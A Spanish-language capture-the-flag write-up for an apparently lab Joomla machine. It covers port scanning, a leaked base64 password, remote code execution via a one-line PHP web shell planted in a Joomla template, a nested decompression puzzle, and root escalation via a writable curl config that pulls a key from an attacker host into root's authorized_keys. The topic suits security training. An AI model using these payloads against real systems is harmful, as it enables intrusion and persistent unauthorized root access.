------
- Tags: #curl #hexadecimal #joomla 
-  --------
## Técnicas utilizadas
- Information Leakage wtf xd  
- Joomla Enumeration  
- Joomla Exploitation [Abusing Templates] [RCE]  
- Decompression Challenge  
- Abusing Curl [Playing with Config files] [Privilege Escalation]
## Procedimiento
![[Pasted image 20230728155949.png]]

#### Reconocimiento
Si lanzamos un **nmap** contra la maquina, podemos observar los siguientes puertos abiertos:
```ruby
# nmap -sCV -p22,80 -oN Ports 10.10.10.150
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-29 03:26 UTC
Nmap scan report for 10.10.10.150
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8ad169b490203ea7b65401eb68303aca (RSA)
|   256 9f0bc2b20bad8fa14e0bf63379effb43 (ECDSA)
|_  256 c12a3544300c5b566a3fa5cc6466d9a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: Joomla! - Open Source Content Management
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.15 seconds
```

Un escaneo con **whatweb** para descubrir tecnologías que estan corriendo por detrás nos muestra este resultado:
```ruby
# whatweb 10.10.10.150
http://10.10.10.150 [200 OK] Apache[2.4.29], Bootstrap, Cookies[c0548020854924e0aecd05ed9f5b672b], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[c0548020854924e0aecd05ed9f5b672b], IP[10.10.10.150], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json], Title[Home]
```

----------
#### Information Leakage wtf xd 
Si revisamos el codigo fuente, encontramos una **hint** que nos incita a visitar un archivo de nombre **secret.txt**:
![[Pasted image 20230729032827.png]]

Si le aplicamos un `base64 -d` a la cadena que encontramos, podemos dar con la contraseña del usuario **floris**, asi que deberiamos poder iniciar sesión en el Joomla.

-------
#### Joomla Enumeration
##### Joomla Exploitation
Pasa abusar de Joomla es tan facil como irnos a la sección de **templates**, seleccionamos un **template** y dentro vamos a crear un nuevo archivo con extensión **.php** y dentro de este, vamos a colocar el tipico:
`<?php system($_REQUEST['cmd']); ?>`

Y ahora solo tendriamos que visitar la ruta:
`http://10.10.10.10/template/<name-template>/pwned.php?cmd=whoami`

Y veriamos el output del comando:
![[Pasted image 20230729033058.png]]

---------
#### Decompression Challenge
Dentro encontramos un archivo de nombre **password_backup** que al hacerle un **cat** vemos que esta en formato Hexadecimal:
![[Pasted image 20230729033252.png]]

Si le hacemos el proceso inverso, lo almacenamos en un archivo y despues le aplicamos un **file** vemos que se trata de un archivo **bzip2**:
```
# cat password_backup | xxd -r > /tmp/file && file /tmp/file
/tmp/file: bzip compressed data, block size = 900k
```

Ahora, le podemos hacer simplemente un `bzip2 -d /tmp/file` y ver el contenido. Ahora, si aplicamos un **file** nos indica que es un archivo **.gz**, entonces, lo renombramos a **file.gz** y le hacemos un `gunzip /tmp/file.gz`. Lo curioso es que, ahora, el archivo es otro **.bzip2**, asi que volvemos a repetir todo el proceso a hasta encontrar data. Al final, podemos encontrar la contraseña del usuario **floris**:
![[Pasted image 20230729033506.png]]

--------
#### Abusing Curl [Playing with Config files] Privilege Escalation
Enumerando el sistema, encontramos un comando que se esta ejecutando a intervalos regulares de tiempo ( con la herramienta pspy logramos verlo ) el cual esta aplicando un `curl -K` hacia un archivo de configuración el cual de primeras tenemos capacidad de lectura y de escritura. Pues nosotros, cuando veamos que se este aconteciendo esto, podemos abusar de esto de la siguiente forma.

1. Podemos depositar cualquier archivo en cualquier ruta del sistema ( dado que lo ejecuta root ).
2. Entonces, podemos alterar el **/etc/passwd** o cualquier otro archivo critico el cual nos permite escalar privilegios.
3. Modificamos el archivo **input** y colocaremos lo siguiente:
```
url = "http://10.10.10.10/id_rsa.pub"
output = "/root/.ssh/authorized_keys"
```
4. Ahora podemos conectarnos con **ssh** como **root** sin proporcinar contraseña.